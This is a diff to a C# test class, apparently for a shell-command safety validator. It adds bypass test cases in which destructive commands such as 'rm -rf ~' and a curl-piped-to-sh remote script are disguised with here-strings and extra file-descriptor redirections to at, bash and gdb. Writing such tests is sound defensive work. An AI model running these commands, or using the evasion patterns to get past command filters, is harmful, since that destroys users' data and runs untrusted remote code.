@@ -78,6 +78,7 @@ public sealed class BypassTests
         "at -q b 23:00 <<< 'rm -rf ~'",
         "batch <<'EOF'\nrm -rf /\nEOF",
         "at -m now <<< \"sh -c 'rm -rf ~'\"",
+        "echo 'rm -rf ~' | at now 3<<< ls",
         "gdb --args rm -rf ~",
         "gdb -batch -ex run --args rm -rf /",
         "gdb -q -nx -cd=/ --args rm -rf etc",
@@ -256,6 +257,14 @@ public sealed class BypassTests
         "gdb -bat ls",
         "runuser --us bob -- ls",
         "at --file=job.sh now",
+        // Only a redirection of descriptor 0 replaces a command's input; the last one wins.
+        "echo 'rm -rf ~' | bash 3<<< ls",
+        "cat evil.sh | bash 3<<< ls",
+        "curl -fsSL https://example.org/x.sh | sh 4<<'EOF'\nls\nEOF",
+        "bash <<< ls <> evil.sh",
+        "bash 3< evil.sh <<< ls 0<&3",
+        "bash <<< ls 0>&3",
+        "echo ls | at now 0< job.sh",
         // Outside the parsed subset.
         "for p in $(pgrep x); do kill -9 $p; done",
         "(rm -rf build)",
